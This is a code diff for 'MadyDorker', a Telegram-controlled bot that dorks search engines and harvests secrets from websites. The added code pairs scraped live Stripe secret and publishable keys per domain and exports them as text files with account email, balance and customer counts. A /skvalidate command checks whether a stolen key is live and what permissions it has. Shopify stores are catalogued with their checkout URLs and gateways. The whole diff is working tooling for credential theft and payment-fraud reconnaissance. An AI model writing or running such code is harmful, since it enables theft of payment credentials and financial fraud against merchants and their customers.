@@ -45,6 +45,7 @@ import random
 import asyncio
 import hashlib
 import signal
+import importlib
 from datetime import datetime
 from typing import Dict, List, Optional, Set, Tuple
 from urllib.parse import urlparse
@@ -116,12 +117,16 @@ class MadyDorkerPipeline:
     def __init__(self, config: DorkerConfig = None):
         self.config = config or DorkerConfig()
         self.running = False
+        self.skip_cycle = False
         self._task = None
         self._bot = None
         self._chat_id = None
         
         # Components
-        self.generator = DorkGenerator(self.config.params_dir)
+        self.generator = DorkGenerator(
+            params_dir=self.config.params_dir,
+            custom_dork_file=self.config.custom_dork_file,
+        )
         self.searcher = MultiSearch(
             proxies=self._load_proxies(),
             engines=self.config.engines,
@@ -399,6 +404,97 @@ class MadyDorkerPipeline:
         # Load previous state
         self._load_state()
     
+    def hot_reload(self) -> dict:
+        """Hot-reload scanner modules without restarting the pipeline.
+        
+        Reloads: secret_extractor, js_analyzer, cookie_hunter, dork_generator,
+                 mady_feeder, ecommerce_checker, key_validator
+        
+        Returns dict with reload status for each module.
+        """
+        global MadyFeeder, MadyFeederConfig, feed_to_mady, feed_to_mady_async, get_feeder
+        global KeyValidator, KeyValidation
+        global JSBundleAnalyzer, JSAnalysisResult, analyze_js_bundles
+        global ExtractedSecret
+        results = {}
+        
+        # Modules to reload and their pipeline attribute + class to re-instantiate
+        reload_targets = [
+            ('secret_extractor', 'secret_extractor', 'SecretExtractor'),
+            ('js_analyzer', None, None),  # Module-level patterns, no instance to replace
+            ('cookie_hunter', 'cookie_hunter', 'CookieHunter'),
+            ('dork_generator', 'generator', 'DorkGenerator'),
+            ('mady_feeder', None, None),
+            ('ecommerce_checker', 'ecom_checker', 'EcommerceChecker'),
+            ('key_validator', None, None),
+        ]
+        
+        for module_name, attr_name, class_name in reload_targets:
+            try:
+                if module_name in sys.modules:
+                    mod = importlib.reload(sys.modules[module_name])
+                    results[module_name] = "✅ reloaded"
+                    logger.info(f"[HotReload] Reloaded {module_name}")
+                else:
+                    results[module_name] = "⏭ not loaded"
+                    continue
+                
+                # Re-instantiate pipeline components with fresh classes
+                if attr_name and class_name and hasattr(self, attr_name):
+                    cls = getattr(mod, class_name)
+                    if module_name == 'secret_extractor':
+                        self.secret_extractor = cls(
+                            timeout=self.config.secret_timeout,
+                            max_concurrent=self.config.secret_max_concurrent,
+                        )
+                        ExtractedSecret = mod.ExtractedSecret
+                    elif module_name == 'cookie_hunter' and self.cookie_hunter:
+                        self.cookie_hunter = cls(
+                            config=self.config,
+                            reporter=self.reporter,
+                            db=self.db,
+                            proxy_manager=self.proxy_manager,
+                        )
+                    elif module_name == 'dork_generator':
+                        self.generator = cls(
+                            params_dir=self.config.params_dir,
+                            custom_dork_file=self.config.custom_dork_file,
+                        )
+                    elif module_name == 'ecommerce_checker' and self.ecom_checker:
+                        self.ecom_checker = cls(
+                            config=self.config,
+                            reporter=self.reporter,
+                            db=self.db,
+                            proxy_manager=self.proxy_manager,
+                        )
+                    results[module_name] += f" + {class_name} re-init"
+                
+                # Rebind module-level imports for modules without pipeline instances
+                elif module_name == 'mady_feeder':
+                    MadyFeeder = mod.MadyFeeder
+                    MadyFeederConfig = mod.MadyFeederConfig
+                    feed_to_mady = mod.feed_to_mady
+                    feed_to_mady_async = mod.feed_to_mady_async
+                    get_feeder = mod.get_feeder
+                    results[module_name] += " + globals rebound"
+                elif module_name == 'key_validator':
+                    KeyValidator = mod.KeyValidator
+                    KeyValidation = mod.KeyValidation
+                    results[module_name] += " + globals rebound"
+                elif module_name == 'js_analyzer':
+                    # Rebind imported names so call sites use fresh code
+                    JSBundleAnalyzer = mod.JSBundleAnalyzer
+                    JSAnalysisResult = mod.JSAnalysisResult
+                    analyze_js_bundles = mod.analyze_js_bundles
+                    results[module_name] += " + globals rebound"
+                    
+            except Exception as e:
+                results[module_name] = f"❌ {e}"
+                logger.error(f"[HotReload] Failed to reload {module_name}: {e}")
+        
+        logger.info(f"[HotReload] Complete: {results}")
+        return results
+
     def _load_proxies(self) -> List[str]:
         """Load proxies from file."""
         if not self.config.use_proxies:
@@ -831,6 +927,32 @@ class MadyDorkerPipeline:
                                     "gateways": [gf.data.get("gateway", "") for gf in ecom_result.gateway_plugins],
                                     "secrets": len(ecom_result.secrets_found),
                                 }
+                                # Persist Shopify stores to DB
+                                if (ecom_result.primary_platform
+                                        and ecom_result.primary_platform.name.lower() == "shopify"):
+                                    try:
+                                        from urllib.parse import urlparse
+                                        domain = urlparse(url).netloc
+                                        gw_list = [gf.data.get("gateway", "") for gf in ecom_result.gateway_plugins]
+                                        checkout = ""
+                                        for f in ecom_result.findings:
+                                            if hasattr(f, 'data') and "checkout" in str(f.data).lower():
+                                                checkout = f.data.get("url", "") if isinstance(f.data, dict) else ""
+                                                break
+                                        self.db.add_shopify_store(
+                                            domain=domain,
+                                            url=url,
+                                            store_name=ecom_result.primary_platform.name,
+                                            payment_gateway=", ".join(gw_list) if gw_list else "",
+                                            checkout_url=checkout,
+                                            platform_confidence=ecom_result.primary_platform.confidence,
+                                            cookies_json="{}",
+                                            findings_json=json.dumps([
+                                                str(f) for f in ecom_result.findings[:10]
+                                            ]),
+                                        )
+                                    except Exception as e:
+                                        logger.debug(f"Shopify store persist error: {e}")
                         except Exception as e:
                             logger.debug(f"E-commerce check failed: {e}")
 
@@ -983,6 +1105,34 @@ class MadyDorkerPipeline:
                                         except Exception:
                                             pass
                     
+                    # ─── Step 3a-2: SK/PK Pairing for stripe_keys DB ──────────
+                    if secrets:
+                        try:
+                            from urllib.parse import urlparse
+                            domain = urlparse(url).netloc
+                            sk_lives = [s.value for s in secrets if s.type == "stripe_sk" and s.value.startswith("sk_live_")]
+                            pk_lives = [s.value for s in secrets if s.type == "stripe_pk" and s.value.startswith("pk_live_")]
+                            sk_tests = [s.value for s in secrets if s.type == "stripe_sk" and s.value.startswith("sk_test_")]
+                            pk_tests = [s.value for s in secrets if s.type == "stripe_pk" and s.value.startswith("pk_test_")]
+                            # Pair sk_live with pk_live  (1:1 or best-effort)
+                            for i, sk in enumerate(sk_lives):
+                                pk = pk_lives[i] if i < len(pk_lives) else (pk_lives[0] if pk_lives else None)
+                                self.db.add_stripe_key(
+                                    domain=domain, url=url,
+                                    sk_live=sk, pk_live=pk,
+                                    sk_test=sk_tests[0] if sk_tests else None,
+                                    pk_test=pk_tests[0] if pk_tests else None,
+                                )
+                            # If we only found pk_live without sk, still store
+                            if pk_lives and not sk_lives:
+                                for pk in pk_lives:
+                                    self.db.add_stripe_key(
+                                        domain=domain, url=url,
+                                        sk_live=None, pk_live=pk,
+                                    )
+                        except Exception as e:
+                            logger.debug(f"SK/PK pairing error: {e}")
+
                     # ─── Step 3b: JS Bundle Analysis ───────────────────────────
                     # Parse webpack/Next.js/Vite chunks for hidden API endpoints,
                     # secrets, page routes, GraphQL schemas, env vars, source maps
@@ -2033,6 +2183,7 @@ class MadyDorkerPipeline:
             category: Optional category for targeted generation
         """
         self.cycle_count += 1
+        self.skip_cycle = False  # Reset skip flag for new cycle
         logger.info(f"=== CYCLE {self.cycle_count} STARTING ===")
         
         # Periodic cleanup: remove processed URL entries older than 30 days
@@ -2040,6 +2191,12 @@ class MadyDorkerPipeline:
             try:
                 self.db.cleanup_old_processed_urls(max_age_days=30)
                 logger.debug("Cleaned up old processed URL entries")
+            except Exception:
+                pass
+            # Purge scan history older than 14 days
+            try:
+                self.db.purge_old_scan_history(max_age_days=14)
+                logger.debug("Purged old scan history entries")
             except Exception:
                 pass
         
@@ -2095,6 +2252,9 @@ class MadyDorkerPipeline:
         for i, dork in enumerate(dorks):
             if not self.running:
                 logger.info("Pipeline stopped, breaking cycle")
+                break
+            if self.skip_cycle:
+                logger.info(f"Cycle skipped at dork {i}/{len(dorks)} — moving to next cycle")
                 break
             
             # Skip dorks before checkpoint resume point
@@ -2240,7 +2400,10 @@ class MadyDorkerPipeline:
         
         # Generate dorks in thread to avoid blocking event loop
         total_pool = await asyncio.to_thread(
-            lambda: len(self.generator.generate_all())
+            lambda: len(self.generator.generate_all(
+                max_total=self.config.max_dorks,
+                max_per_pattern=self.config.max_per_pattern,
+            ))
         )
         per_cycle = self.config.max_dorks
         
@@ -2388,6 +2551,7 @@ class MadyDorkerPipeline:
                 if self.running:
                     filepath = await self._write_export()
                     if filepath:
+                        # Text summary
                         await self._send_progress(
                             f"📁 <b>Hourly Export Saved</b>\n"
                             f"<code>{os.path.basename(filepath)}</code>\n"
@@ -2396,6 +2560,8 @@ class MadyDorkerPipeline:
                             f"Gateways: {len(self.found_gateways)} | "
                             f"Cards: {len(self.found_cards)}"
                         )
+                        # Send .txt file as document attachment
+                        await self._send_export_file(filepath)
                         # Also send to report group
                         if self._report_chat_id:
                             await self._send_to_report_group(
@@ -2829,7 +2995,10 @@ async def cmd_dorkon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Store telegram context for progress messages
     p.set_telegram_context(context.bot, update.effective_chat.id)
     
-    total_dorks = await asyncio.to_thread(lambda: len(p.generator.generate_all()))
+    total_dorks = await asyncio.to_thread(lambda: len(p.generator.generate_all(
+        max_total=p.config.max_dorks,
+        max_per_pattern=p.config.max_per_pattern,
+    )))
     per_cycle = p.config.max_dorks
     engines = p.config.engines
     await update.message.reply_text(
@@ -5260,13 +5429,78 @@ async def cmd_unionstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /keys command — show API key validator stats."""
+    """Handle /keys command — export all Stripe keys as .txt file attachment."""
     p = get_pipeline()
     if not p.key_validator:
-        await update.message.reply_text("❌ API key validator is not enabled. Set key_validation_enabled=True in config.")
+        await update.message.reply_text("❌ API key validator is not enabled.")
         return
-    text = p.key_validator.get_stats_text()
-    await update.message.reply_text(text, parse_mode="HTML")
+
+    # Get stats text as header
+    stats_text = p.key_validator.get_stats_text()
+
+    # Get all stripe keys from DB
+    keys = p.db.get_stripe_keys(limit=500, live_only=False)
+    live_keys = p.db.get_stripe_keys(limit=500, live_only=True)
+
+    if not keys:
+        await update.message.reply_text(
+            f"{stats_text}\n\n📭 No Stripe keys in database yet.",
+            parse_mode="HTML",
+        )
+        return
+
+    # Build .txt file content
+    lines = []
+    lines.append("=" * 60)
+    lines.append("  MadyDorker — Stripe Keys Export")
+    lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append(f"  Total Keys: {len(keys)} | Live: {len(live_keys)}")
+    lines.append("=" * 60)
+    lines.append("")
+
+    for i, k in enumerate(keys, 1):
+        lines.append(f"--- Key #{i} ---")
+        lines.append(f"Domain:    {k.get('domain', 'N/A')}")
+        lines.append(f"SK Live:   {k.get('sk_live', 'N/A')}")
+        lines.append(f"PK Live:   {k.get('pk_live', 'N/A') or 'N/A'}")
+        lines.append(f"Live:      {'YES' if k.get('is_live') else 'NO'}")
+        if k.get('is_live'):
+            lines.append(f"Account:   {k.get('account_id', '')}")
+            lines.append(f"Email:     {k.get('account_email', '')}")
+            lines.append(f"Business:  {k.get('business_name', '')}")
+            lines.append(f"Country:   {k.get('country', '')}")
+            lines.append(f"Balance:   {k.get('balance_json', '{}')}")
+            lines.append(f"Charges:   {k.get('charges_count', '?')}")
+            lines.append(f"Customers: {k.get('customers_count', '?')}")
+            lines.append(f"Products:  {k.get('products_count', '?')}")
+            lines.append(f"Subs:      {k.get('subscriptions_count', '?')}")
+            lines.append(f"Risk:      {k.get('risk_level', '?')}")
+        lines.append(f"Found:     {k.get('found_at', 'N/A')}")
+        lines.append(f"URL:       {k.get('url', 'N/A')}")
+        lines.append("")
+
+    content = "\n".join(lines)
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"stripe_keys_{ts}.txt"
+    filepath = os.path.join("exports", filename)
+    os.makedirs("exports", exist_ok=True)
+    with open(filepath, "w") as f:
+        f.write(content)
+
+    # Send summary + file
+    await update.message.reply_text(
+        f"{stats_text}\n\n"
+        f"📦 <b>{len(keys)} keys</b> ({len(live_keys)} live) — sending file...",
+        parse_mode="HTML",
+    )
+    try:
+        with open(filepath, "rb") as f:
+            await update.message.reply_document(
+                document=f, filename=filename,
+                caption=f"🔑 Stripe Keys Export — {len(keys)} keys ({len(live_keys)} live)",
+            )
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to send file: {e}")
 
 
 async def cmd_mlfilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -5279,7 +5513,213 @@ async def cmd_mlfilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(text, parse_mode="HTML")
 
 
-# ==================== ENTRY POINT ====================
+async def cmd_hotreload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /hotreload command — reload scanner modules without restarting."""
+    await update.message.reply_text("🔄 Hot-reloading modules...")
+    try:
+        p = get_pipeline()
+        results = p.hot_reload()
+        lines = ["<b>🔥 Hot Reload Results:</b>"]
+        for mod, status in results.items():
+            lines.append(f"  • <code>{mod}</code>: {status}")
+        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
+    except Exception as e:
+        logger.error(f"Hot reload failed: {e}")
+        await update.message.reply_text(f"❌ Hot reload failed: {e}")
+
+
+async def cmd_skip(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /skip command — skip current dork batch and move to next cycle."""
+    p = get_pipeline()
+    if not p.running:
+        await update.message.reply_text("❌ Pipeline is not running.")
+        return
+    if p.skip_cycle:
+        await update.message.reply_text("⏭ Already skipping — waiting for current URLs to finish...")
+        return
+    
+    dorks_done = p.reporter.stats.dorks_processed if hasattr(p.reporter, 'stats') else '?'
+    p.skip_cycle = True
+    logger.info("[Skip] User requested cycle skip")
+    await update.message.reply_text(
+        f"⏭ <b>Skipping current batch</b>\n"
+        f"Dorks processed so far: {dorks_done}\n"
+        f"Finishing in-flight URLs, then starting next cycle...",
+        parse_mode="HTML",
+    )
+
+
+async def cmd_stores(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /stores command — export Shopify stores as .txt file attachment."""
+    p = get_pipeline()
+    stores = p.db.get_shopify_stores(limit=500)
+
+    if not stores:
+        await update.message.reply_text("📭 No Shopify stores found yet.")
+        return
+
+    lines = []
+    lines.append("=" * 60)
+    lines.append("  MadyDorker — Shopify Stores Export")
+    lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append(f"  Total Stores: {len(stores)}")
+    lines.append("=" * 60)
+    lines.append("")
+
+    for i, s in enumerate(stores, 1):
+        lines.append(f"--- Store #{i} ---")
+        lines.append(f"Domain:     {s.get('domain', 'N/A')}")
+        lines.append(f"URL:        {s.get('url', 'N/A')}")
+        lines.append(f"Gateway:    {s.get('payment_gateway', 'N/A')}")
+        lines.append(f"Checkout:   {s.get('checkout_url', 'N/A') or 'N/A'}")
+        lines.append(f"Has Keys:   {'YES' if s.get('has_stripe_keys') else 'NO'}")
+        lines.append(f"Confidence: {s.get('platform_confidence', 0):.0%}")
+        lines.append(f"Found:      {s.get('found_at', 'N/A')}")
+        lines.append(f"Last Seen:  {s.get('last_seen', 'N/A')}")
+        lines.append("")
+
+    content = "\n".join(lines)
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"shopify_stores_{ts}.txt"
+    filepath = os.path.join("exports", filename)
+    os.makedirs("exports", exist_ok=True)
+    with open(filepath, "w") as f:
+        f.write(content)
+
+    await update.message.reply_text(
+        f"🛒 <b>{len(stores)} Shopify stores found</b> — sending file...",
+        parse_mode="HTML",
+    )
+    try:
+        with open(filepath, "rb") as f:
+            await update.message.reply_document(
+                document=f, filename=filename,
+                caption=f"🛒 Shopify Stores Export — {len(stores)} stores",
+            )
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to send file: {e}")
+
+
+async def cmd_del(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /del command — delete an export file from the server."""
+    import re
+    args = context.args
+    if not args:
+        # List available export files
+        export_dir = "exports"
+        if not os.path.isdir(export_dir):
+            await update.message.reply_text("📁 No exports directory found.")
+            return
+        files = sorted(os.listdir(export_dir))
+        if not files:
+            await update.message.reply_text("📁 Export directory is empty.")
+            return
+        file_list = "\n".join(f"  <code>{f}</code>" for f in files[-20:])
+        await update.message.reply_text(
+            f"📁 <b>Export Files</b> ({len(files)} total):\n{file_list}\n\n"
+            f"Usage: <code>/del filename.txt</code>\n"
+            f"Use <code>/del all</code> to delete all exports.",
+            parse_mode="HTML",
+        )
+        return
+
+    target = args[0]
+
+    if target.lower() == "all":
+        export_dir = "exports"
+        if os.path.isdir(export_dir):
+            count = 0
+            for f in os.listdir(export_dir):
+                try:
+                    os.remove(os.path.join(export_dir, f))
+                    count += 1
+                except Exception:
+                    pass
+            await update.message.reply_text(f"🗑 Deleted {count} export files.")
+        else:
+            await update.message.reply_text("📁 No exports directory found.")
+        return
+
+    # Validate filename pattern to prevent path traversal
+    safe_pattern = re.compile(r'^[\w\-\.]+\.(txt|json|csv)$')
+    if not safe_pattern.match(target):
+        await update.message.reply_text("❌ Invalid filename. Only .txt/.json/.csv export files allowed.")
+        return
+
+    filepath = os.path.join("exports", target)
+    if not os.path.isfile(filepath):
+        await update.message.reply_text(f"❌ File not found: <code>{target}</code>", parse_mode="HTML")
+        return
+
+    # Delete the file and its sibling formats
+    deleted = []
+    base = os.path.splitext(target)[0]
+    for ext in [".txt", ".json", ".csv"]:
+        sibling = os.path.join("exports", base + ext)
+        if os.path.isfile(sibling):
+            try:
+                os.remove(sibling)
+                deleted.append(base + ext)
+            except Exception:
+                pass
+
+    if deleted:
+        del_list = ", ".join(f"<code>{d}</code>" for d in deleted)
+        await update.message.reply_text(f"🗑 Deleted: {del_list}", parse_mode="HTML")
+    else:
+        await update.message.reply_text("❌ Failed to delete file.")
+
+
+async def cmd_skvalidate(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /skvalidate command — on-demand validation of a Stripe SK key."""
+    p = get_pipeline()
+    if not p.key_validator:
+        await update.message.reply_text("❌ Key validator is not enabled.")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text(
+            "Usage: <code>/skvalidate sk_live_xxxx</code>\n"
+            "Validates the key and shows full recon info.",
+            parse_mode="HTML",
+        )
+        return
+
+    key = args[0].strip()
+    if not key.startswith("sk_live_") and not key.startswith("sk_test_"):
+        await update.message.reply_text("❌ Please provide a valid Stripe secret key (sk_live_* or sk_test_*).")
+        return
+
+    await update.message.reply_text(f"🔍 Validating <code>{key[:20]}...</code>", parse_mode="HTML")
+
+    try:
+        result = await p.key_validator.validate_and_report(
+            key_type="stripe_sk",
+            key_value=key,
+            source_url="manual /skvalidate command",
+        )
+        if result.is_live:
+            acct_lines = "\n".join(f"  {k}: {v}" for k, v in result.account_info.items())
+            perms = ", ".join(result.permissions) if result.permissions else "unknown"
+            await update.message.reply_text(
+                f"✅ <b>Key is LIVE!</b>\n"
+                f"Key: <code>{result.display_key}</code>\n"
+                f"Confidence: {result.confidence:.0%}\n\n"
+                f"<b>Account Info:</b>\n<code>{acct_lines}</code>\n\n"
+                f"<b>Permissions:</b> {perms}",
+                parse_mode="HTML",
+            )
+        else:
+            err = result.error or "Key is dead/invalid"
+            await update.message.reply_text(
+                f"❌ <b>Key is DEAD</b>\n"
+                f"Key: <code>{key[:25]}...</code>\n"
+                f"Error: {err}",
+                parse_mode="HTML",
+            )
+    except Exception as e:
+        await update.message.reply_text(f"❌ Validation failed: {e}")# ==================== ENTRY POINT ==
 
 def main():
     """Main entry point."""
@@ -5298,6 +5738,17 @@ def main():
         return
     
     logger.info("Starting MadyDorker v3.0 Telegram Bot...")
+    
+    # SIGHUP handler for hot-reload from command line (kill -HUP <pid>)
+    def _sighup_handler(signum, frame):
+        logger.info("[SIGHUP] Received — triggering hot reload...")
+        try:
+            p = get_pipeline()
+            results = p.hot_reload()
+            logger.info(f"[SIGHUP] Hot reload results: {results}")
+        except Exception as e:
+            logger.error(f"[SIGHUP] Hot reload failed: {e}")
+    signal.signal(signal.SIGHUP, _sighup_handler)
     
     app = Application.builder().token(config.telegram_bot_token).build()
     
@@ -5336,7 +5787,22 @@ def main():
     app.add_handler(CommandHandler("unionstats", cmd_unionstats, filters=chat_filter))
     app.add_handler(CommandHandler("keys", cmd_keys, filters=chat_filter))
     app.add_handler(CommandHandler("mlfilter", cmd_mlfilter, filters=chat_filter))
+    app.add_handler(CommandHandler("hotreload", cmd_hotreload, filters=chat_filter))
+    app.add_handler(CommandHandler("skip", cmd_skip, filters=chat_filter))
+    app.add_handler(CommandHandler("stores", cmd_stores, filters=chat_filter))
+    app.add_handler(CommandHandler("del", cmd_del, filters=chat_filter))
+    app.add_handler(CommandHandler("skvalidate", cmd_skvalidate, filters=chat_filter))
     
+    # Auto-start pipeline on boot if configured
+    if config.auto_start_pipeline:
+        async def post_init(application: Application) -> None:
+            global pipeline_task
+            p = get_pipeline()
+            p.set_telegram_context(application.bot, int(config.telegram_group_id))
+            logger.info("Auto-starting pipeline (auto_start_pipeline=True)...")
+            pipeline_task = asyncio.create_task(p.start())
+        app.post_init = post_init
+
     logger.info("Bot handlers registered, starting polling...")
     app.run_polling(drop_pending_updates=True)
 
